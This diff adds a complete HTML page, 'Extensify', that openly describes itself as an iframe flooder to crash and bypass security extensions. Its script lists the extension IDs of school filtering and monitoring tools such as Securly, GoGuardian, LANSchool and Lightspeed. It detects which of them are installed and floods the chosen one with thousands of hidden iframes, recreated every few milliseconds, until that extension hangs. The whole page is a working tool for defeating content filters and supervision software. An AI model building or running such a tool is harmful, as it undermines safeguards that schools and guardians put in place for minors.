@@ -1,0 +1,720 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Extensify</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <link rel="icon" href="https://www.gstatic.com/classroom/ic_product_classroom_32.png">
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap');
+
+    :root {
+      --bg: #0a0a0a;
+      --surface: #161616;
+      --surface-hover: #1a1a1a;
+      --surface-elevated: #1e1e1e;
+      --border: #262626;
+      --border-hover: #383838;
+      --border-focus: #525252;
+      --text-primary: #fafafa;
+      --text-secondary: #a3a3a3;
+      --text-muted: #737373;
+      --accent: #60a5fa;
+      --accent-hover: #3b82f6;
+      --accent-muted: #1e40af;
+      --success: #34d399;
+      --danger: #f87171;
+      --shadow-sm: 0 1px 2px 0 rgb(0 0 0 / 0.05);
+      --shadow: 0 1px 3px 0 rgb(0 0 0 / 0.1), 0 1px 2px -1px rgb(0 0 0 / 0.1);
+      --shadow-lg: 0 10px 15px -3px rgb(0 0 0 / 0.1), 0 4px 6px -4px rgb(0 0 0 / 0.1);
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Inter', sans-serif;
+      background: var(--bg);
+      color: var(--text-primary);
+      line-height: 1.6;
+      min-height: 100vh;
+      font-weight: 400;
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+    }
+
+    header {
+      padding: 4rem 0 3rem;
+      text-align: center;
+    }
+
+    .header-content {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 1rem;
+    }
+
+    .logo-icon {
+      font-size: 1.75rem;
+      color: var(--accent);
+      opacity: 0.9;
+    }
+
+    .main-title {
+      font-size: 2rem;
+      font-weight: 600;
+      color: var(--text-primary);
+      letter-spacing: -0.025em;
+    }
+
+    .container {
+      max-width: 480px;
+      margin: 0 auto;
+      padding: 0 1.5rem;
+    }
+
+    .card {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 20px;
+      padding: 3rem;
+      margin-bottom: 2rem;
+      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      box-shadow: var(--shadow);
+      backdrop-filter: blur(10px);
+    }
+
+    .card:hover {
+      border-color: var(--border-hover);
+      box-shadow: 0 20px 25px -5px rgb(0 0 0 / 0.1), 0 8px 10px -6px rgb(0 0 0 / 0.1);
+      transform: translateY(-2px);
+    }
+
+    .info-text {
+      text-align: center;
+      color: var(--text-secondary);
+      margin-bottom: 2.5rem;
+      font-size: 0.95rem;
+      font-weight: 300;
+    }
+
+    .section {
+      margin-bottom: 2rem;
+    }
+
+    .section-label {
+      display: block;
+      font-weight: 600;
+      color: var(--text-primary);
+      margin-bottom: 0.75rem;
+      font-size: 0.8125rem;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+      transition: color 0.2s ease;
+    }
+
+    .dropdown {
+      width: 100%;
+      padding: 1.125rem 1.25rem;
+      font-size: 0.9375rem;
+      background: var(--surface-elevated);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      color: var(--text-primary);
+      outline: none;
+      transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
+      font-family: inherit;
+      box-shadow: var(--shadow-sm);
+      font-weight: 500;
+    }
+
+    .dropdown:hover {
+      border-color: var(--border-hover);
+      background: var(--surface-hover);
+      transform: translateY(-1px);
+      box-shadow: var(--shadow);
+    }
+
+    .dropdown:focus {
+      border-color: var(--accent);
+      background: var(--surface-hover);
+      transform: translateY(-1px);
+      box-shadow: 0 0 0 3px rgb(96 165 250 / 0.1);
+    }
+
+    .slider-container {
+      display: flex;
+      align-items: center;
+      gap: 1.25rem;
+      padding: 1.125rem 1.25rem;
+      background: var(--surface-elevated);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
+      box-shadow: var(--shadow-sm);
+    }
+
+    .slider-container:hover {
+      border-color: var(--border-hover);
+      background: var(--surface-hover);
+      transform: translateY(-1px);
+      box-shadow: var(--shadow);
+    }
+
+    .slider-container:focus-within {
+      border-color: var(--accent);
+      background: var(--surface-hover);
+      transform: translateY(-1px);
+      box-shadow: 0 0 0 3px rgb(96 165 250 / 0.1);
+    }
+
+    .number-input {
+      flex: 1;
+      background: transparent;
+      border: none;
+      color: var(--text-primary);
+      font-size: 0.9375rem;
+      outline: none;
+      font-family: inherit;
+      font-weight: 500;
+    }
+
+    .value-display {
+      font-weight: 700;
+      color: var(--accent);
+      font-size: 0.9375rem;
+      min-width: 70px;
+      text-align: center;
+      padding: 0.5rem 0.875rem;
+      background: rgba(96, 165, 250, 0.12);
+      border-radius: 8px;
+      border: 1px solid rgba(96, 165, 250, 0.25);
+      font-feature-settings: 'tnum';
+    }
+
+    .button-area {
+      display: flex;
+      justify-content: center;
+      gap: 0.75rem;
+      margin-top: 2.5rem;
+    }
+
+    .btn {
+      padding: 1.125rem 2rem;
+      font-size: 0.9375rem;
+      font-weight: 600;
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      cursor: pointer;
+      transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
+      display: inline-flex;
+      align-items: center;
+      gap: 0.625rem;
+      font-family: inherit;
+      background: var(--surface-elevated);
+      color: var(--text-primary);
+      box-shadow: var(--shadow-sm);
+      position: relative;
+      overflow: hidden;
+      letter-spacing: 0.01em;
+    }
+
+    .btn::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: linear-gradient(135deg, rgba(255,255,255,0.1), rgba(255,255,255,0.05));
+      opacity: 0;
+      transition: opacity 0.25s ease;
+    }
+
+    .btn:hover:not(:disabled) {
+      border-color: var(--border-hover);
+      background: var(--surface-hover);
+      transform: translateY(-2px);
+      box-shadow: var(--shadow-lg);
+    }
+
+    .btn:hover:not(:disabled)::before {
+      opacity: 1;
+    }
+
+    .btn-primary {
+      background: var(--accent);
+      border-color: var(--accent);
+      color: white;
+    }
+
+    .btn-primary:hover:not(:disabled) {
+      background: var(--accent-hover);
+      border-color: var(--accent-hover);
+      box-shadow: 0 10px 25px -5px rgb(59 130 246 / 0.25), 0 8px 10px -6px rgb(59 130 246 / 0.1);
+    }
+
+    .btn-danger {
+      background: var(--danger);
+      border-color: var(--danger);
+      color: white;
+      display: none;
+    }
+
+    .btn-danger:hover:not(:disabled) {
+      background: #dc2626;
+      border-color: #dc2626;
+      box-shadow: 0 10px 25px -5px rgb(248 113 113 / 0.25), 0 8px 10px -6px rgb(248 113 113 / 0.1);
+    }
+
+    .btn:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+    }
+
+    .btn:active {
+      transform: translateY(1px);
+    }
+
+    .status-container {
+      margin-top: 2rem;
+      padding: 1.25rem 1.5rem;
+      background: var(--surface-elevated);
+      border-radius: 12px;
+      border: 1px solid rgba(52, 211, 153, 0.3);
+      border-left: 3px solid var(--success);
+      display: none;
+      box-shadow: var(--shadow);
+    }
+
+    .credits {
+      text-align: center;
+      margin-top: 3rem;
+      padding: 1.5rem 0;
+      color: var(--text-muted);
+      font-size: 0.8125rem;
+      font-weight: 400;
+      border-top: 1px solid var(--border);
+    }
+
+    .developer-name {
+      color: var(--accent);
+      font-weight: 600;
+      transition: color 0.2s ease;
+    }
+
+    .credits:hover .developer-name {
+      color: var(--accent-hover);
+    }
+
+    .status-title {
+      font-weight: 500;
+      color: var(--text-primary);
+      margin-bottom: 0.25rem;
+      font-size: 0.875rem;
+    }
+
+    .status-desc {
+      color: var(--text-secondary);
+      font-size: 0.8125rem;
+    }
+
+    .loading-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(10, 10, 10, 0.95);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      z-index: 1000;
+    }
+
+    .loading-spinner {
+      width: 32px;
+      height: 32px;
+      border: 2px solid var(--border);
+      border-radius: 50%;
+      border-top: 2px solid var(--accent);
+      animation: spin 1s linear infinite;
+      margin-bottom: 1.5rem;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .loading-text {
+      font-size: 0.875rem;
+      font-weight: 500;
+      color: var(--text-primary);
+      margin-bottom: 0.25rem;
+    }
+
+    .loading-subtext {
+      color: var(--text-secondary);
+      font-size: 0.8125rem;
+    }
+
+    /* Subtle focus indicators */
+    .dropdown:focus,
+    .slider-container:focus-within,
+    .btn:focus {
+      outline: none;
+    }
+
+    /* Smooth micro-interactions */
+    .section-label {
+      display: block;
+      font-weight: 600;
+      color: var(--text-primary);
+      margin-bottom: 0.75rem;
+      font-size: 0.8125rem;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+      transition: color 0.2s ease;
+    }
+
+    .section:hover .section-label {
+      color: var(--accent);
+    }
+
+    /* Enhanced typography */
+    .main-title {
+      font-size: 2rem;
+      font-weight: 600;
+      color: var(--text-primary);
+      letter-spacing: -0.025em;
+    }
+
+    .info-text {
+      text-align: center;
+      color: var(--text-secondary);
+      margin-bottom: 2.75rem;
+      font-size: 0.9375rem;
+      font-weight: 400;
+      line-height: 1.5;
+    }
+
+    /* Better spacing */
+    header {
+      padding: 4rem 0 3.5rem;
+      text-align: center;
+    }
+
+    .button-area {
+      display: flex;
+      justify-content: center;
+      gap: 1rem;
+      margin-top: 2.75rem;
+    }
+
+    /* Clean scrollbar */
+    ::-webkit-scrollbar {
+      width: 6px;
+    }
+
+    ::-webkit-scrollbar-track {
+      background: var(--surface);
+    }
+
+    ::-webkit-scrollbar-thumb {
+      background: var(--border);
+      border-radius: 3px;
+    }
+
+    ::-webkit-scrollbar-thumb:hover {
+      background: var(--border-hover);
+    }
+
+    @media (max-width: 768px) {
+      .container {
+        padding: 0 1rem;
+      }
+      
+      .card {
+        padding: 2rem;
+      }
+      
+      .main-title {
+        font-size: 1.75rem;
+      }
+      
+      .button-area {
+        flex-direction: column;
+      }
+      
+      .btn {
+        width: 100%;
+        justify-content: center;
+      }
+    }
+
+    /* Subtle hover states */
+    .section:hover .section-label {
+      color: var(--accent);
+      transition: color 0.2s ease;
+    }
+
+    /* Clean selection styling */
+    ::selection {
+      background: var(--accent);
+      color: white;
+    }
+
+    /* Remove default focus rings on non-interactive elements */
+    h1, p, div {
+      outline: none;
+    }
+  </style>
+</head>
+
+<body>
+  <header>
+    <div class="header-content">
+      <i class="fas fa-cube logo-icon"></i>
+      <h1 class="main-title">Extensify</h1>
+    </div>
+  </header>
+
+  <main class="container">
+    <div class="card">
+      <p class="info-text">
+        Advanced extension iframe flooder to crash and bypass security extentions.
+      </p>
+
+      <div class="section">
+        <label class="section-label" for="extensionSelect">Extension</label>
+        <select id="extensionSelect" class="dropdown">
+          <option value="">Loading...</option>
+        </select>
+      </div>
+
+      <div class="section">
+        <label class="section-label" for="resourceIntensity">Intensity</label>
+        <div class="slider-container">
+          <input type="number" id="resourceIntensity" class="number-input" min="100" max="15000" value="2000" step="100">
+          <div id="resourceValue" class="value-display">2000</div>
+        </div>
+      </div>
+
+      <div class="button-area">
+        <button id="hangButton" class="btn btn-primary">
+          <i class="fas fa-play"></i>
+          Start
+        </button>
+        <button id="killButton" class="btn btn-danger">
+          <i class="fas fa-check"></i>
+          Finish
+        </button>
+      </div>
+
+      <div id="statusText" class="status-container"></div>
+    </div>
+
+    <div class="credits">
+      Developed by <span class="developer-name">Liam</span>
+    </div>
+  </main>
+
+  <div class="loading-overlay" id="processingOverlay">
+    <div class="loading-spinner"></div>
+    <div class="loading-text">Processing</div>
+    <div class="loading-subtext">Please wait...</div>
+  </div>
+
+  <script>
+    const extensions = {
+      "Securly (3rd ID)": "chrome-extension://ckecmkbnoanpgplccmnoikfmpcdladkc/fonts/Metropolis.css",
+      "Securly (2nd ID)": "chrome-extension://joflmkccibkooplaeoinecjbmdebglab/fonts/Metropolis.css",
+      "Securly (1st ID)": "chrome-extension://iheobagjkfklnlikgihanlhcddjoihkg/fonts/Metropolis.css",
+      "GoGuardian": "chrome-extension://haldlgldplgnggkjaafhelgiaglafanh/youtube_injection.js",
+      "LANSchool": "chrome-extension://baleiojnjpgeojohhhfbichcodgljmnj/blocked.html",
+      "Linewize": "chrome-extension://ddfbkhpmcdbciejenfcolaaiebnjcbfc/background/assets/pages/default-blocked.html",
+      "Blocksi": "chrome-extension://ghlpmldmjjhmdgmneoaibbegkjjbonbk/pages/blockPage.html",
+      "FortiGuard": "chrome-extension://igbgpehnbmhgdgjbhkkpedommgmfbeao/youtube_injection.js",
+      "Cisco Umbrella": "chrome-extension://jcdhmojfecjfmbdpchihbeilohgnbdci/blocked.html",
+      "ContentKeeper": "chrome-extension://jdogphakondfdmcanpapfahkdomaicfa/img/ckauth19x.png",
+      "CK-Authenticator G3": "chrome-extension://odoanpnonilogofggaohhkdkdgbhdljp/img/ckauth19x.png",
+      "Securly Classroom (2nd ID)": "chrome-extension://hkobaiihndnbfhbkmjjfbdimfbdcppdh/notfound.html",
+      "Securly Classroom (1st ID)": "chrome-extension://jfbecfmiegcjddenjhlbhlikcbfmnafd/notfound.html",
+      "Hapara (2nd ID)": "chrome-extension://kbohafcopfpigkjdimdcdgenlhkmhbnc/blocked.html",
+      "Hapara (1st ID)": "chrome-extension://aceopacgaepdcelohobicpffbbejnfac/blocked.html",
+      "iboss": "chrome-extension://kmffehbidlalibfeklaefnckpidbodff/restricted.html",
+      "Lightspeed Digital Insight Agent": "chrome-extension://njdniclgegijdcdliklgieicanpmcngj/js/wasm_exec.js",
+      "Lightspeed Filter Agent": "chrome-extension://adkcpkpghahmbopkjchobieckeoaoeem/icon-128.png",
+      "Lightspeed Classroom": "chrome-extension://kkbmdgjggcdajckdlbngdjonpchpaiea/assets/icon-classroom-128.png",
+      "InterCLASS Filtering Service": "chrome-extension://jbddgjglgkkneonnineaohdhabjbgopi/pages/message-page.html",
+      "InterSafe GatewayConnection Agent": "chrome-extension://ecjoghccnjlodjlmkgmnhmpmhghcbnaf/resources/options.js",
+      "LoiLo Web Filters": "chrome-extension://pabjlbjcgldndnpjnokjakbdofjgnfia/image/allow_icon/shield_green_128x128.png",
+      "Gopher Buddy": "chrome-extension://cgbbbjmgdpnifijconhamggjehlamcif/images/gopher-buddy_128x128_color.png",
+      "LanSchool Web Helper": "chrome-extension://honjcnefekfnompampcpmcdadibmjhlk/blocked.html",
+      "IMTLazarus": "chrome-extension://cgigopjakkeclhggchgnhmpmhghcbnaf/models/model.json",
+      "Impero Backdrop": "chrome-extension://jjpmjccpemllnmgiaojaafhelgiaglafanh/licenses.html",
+      "Mobile Guardian": "chrome-extension://fgmafhdohjkdhfaacgbgclmfgkgokgmb/block.html",
+      "NetSupport School Student": "chrome-extension://gcjpefhffmcgplgklffgbebganmhffje/_locales/lt/messages.json",
+      "classroom.cloud Student": "chrome-extension://mpkdoimpgkhjcicmhmlmgboelebflpla/_locales/lt/messages.json",
+      "Lockdown Browser": "chrome-extension://fogjeanjfbiombghnmkmmophfeccjdki/manifest.json",
+      "Linewize Filter": "chrome-extension://ifinpabiejbjobcphhaomiifjibpkjlf/background/assets/pages/default-blocked.html",
+      "Borderless Classroom Student": "chrome-extension://kdpgkligilplaanoablcpjahjjeghcl/pages/blockPage.html",
+      "LockDown Browser AP Classroom Edition": "chrome-extension://djpknfecbncogekjnjppojlaipeobkmo/assets/images/icon_128.png",
+      "Lugus School": "chrome-extension://eoobggamkobbcpiojefejfglbfcacgca/assets/images/icon_128.png"
+    };
+
+    const intensitySlider = document.getElementById('resourceIntensity');
+    const intensityValue = document.getElementById('resourceValue');
+    const selectElement = document.getElementById('extensionSelect');
+    const overlay = document.getElementById('processingOverlay');
+    const killButton = document.getElementById('killButton');
+    const hangButton = document.getElementById('hangButton');
+    const statusText = document.getElementById('statusText');
+
+    intensitySlider.addEventListener('input', function () {
+      intensityValue.textContent = this.value;
+    });
+
+    async function checkExtensionURL(url) {
+      try {
+        const response = await fetch(url);
+        return response.ok;
+      } catch (error) {
+        return false;
+      }
+    }
+
+    async function populateExtensionDropdown() {
+      let foundExtensions = false;
+
+      for (const [name, url] of Object.entries(extensions)) {
+        try {
+          if (await checkExtensionURL(url)) {
+            const option = document.createElement('option');
+            option.value = url;
+            option.textContent = name;
+            selectElement.appendChild(option);
+            foundExtensions = true;
+          }
+        } catch (error) {
+          // Silent fail
+        }
+      }
+
+      if (!foundExtensions) {
+        const option = document.createElement('option');
+        option.value = '';
+        option.textContent = 'No extensions found';
+        selectElement.appendChild(option);
+        hangButton.disabled = true;
+      } else {
+        selectElement.innerHTML = '';
+        for (const [name, url] of Object.entries(extensions)) {
+          try {
+            if (await checkExtensionURL(url)) {
+              const option = document.createElement('option');
+              option.value = url;
+              option.textContent = name;
+              selectElement.appendChild(option);
+            }
+          } catch (error) {
+            // Silent fail
+          }
+        }
+      }
+    }
+
+    function createAndReplaceIframes(container, url, count) {
+      for (let i = 0; i < count; i++) {
+        const iframe = document.createElement('iframe');
+        iframe.src = url;
+        iframe.style.cssText = 'width:1px;height:1px;border:none;position:absolute;';
+        container.appendChild(iframe);
+      }
+
+      setTimeout(() => {
+        while (container.firstChild) {
+          container.removeChild(container.firstChild);
+        }
+        createAndReplaceIframes(container, url, count);
+      }, 5);
+    }
+
+    function startProcess() {
+      const selectedUrl = selectElement.value;
+      const selectedName = selectElement.options[selectElement.selectedIndex].text;
+      const resourceCount = parseInt(intensitySlider.value);
+
+      if (!selectedUrl) {
+        alert('Please select an extension first.');
+        return;
+      }
+
+      overlay.style.display = 'flex';
+
+      const popup = window.open('', 'ExtensionManager', 'width=10,height=10,left=0,top=0');
+      if (!popup) {
+        alert('Popup blocked. Please allow popups.');
+        overlay.style.display = 'none';
+        return;
+      }
+
+      const container = popup.document.createElement('div');
+      popup.document.body.appendChild(container);
+      createAndReplaceIframes(container, selectedUrl, resourceCount);
+
+      setTimeout(() => {
+        popup.close();
+        setTimeout(() => {
+          overlay.style.display = 'none';
+          hangButton.style.display = 'none';
+          selectElement.parentElement.style.display = 'none';
+          intensitySlider.parentElement.parentElement.style.display = 'none';
+
+          killButton.style.display = 'inline-flex';
+          killButton.setAttribute('data-url', selectedUrl);
+
+          statusText.style.display = 'block';
+          statusText.innerHTML = `
+            <div class="status-title">Extension suspended: ${selectedName}</div>
+            <div class="status-desc">Click finish to complete the process.</div>
+          `;
+        }, 10000);
+      }, 5000);
+    }
+
+    function finalizeProcess() {
+      const selectedUrl = killButton.getAttribute('data-url');
+      killButton.style.display = 'none';
+      statusText.innerHTML = `
+        <div class="status-title">Process completed</div>
+        <div class="status-desc">Extension management finished successfully.</div>
+      `;
+      setTimeout(() => {
+        window.location.href = selectedUrl;
+      }, 100);
+    }
+
+    document.addEventListener('DOMContentLoaded', function () {
+      if (navigator.deviceMemory) {
+        const defaultIntensity = Math.min(Math.round(navigator.deviceMemory * 500), 15000);
+        intensitySlider.value = defaultIntensity;
+        intensityValue.textContent = defaultIntensity;
+      }
+    });
+
+    hangButton.addEventListener('click', startProcess);
+    killButton.addEventListener('click', finalizeProcess);
+    populateExtensionDropdown();
+  </script>
+</body>
+
+</html>
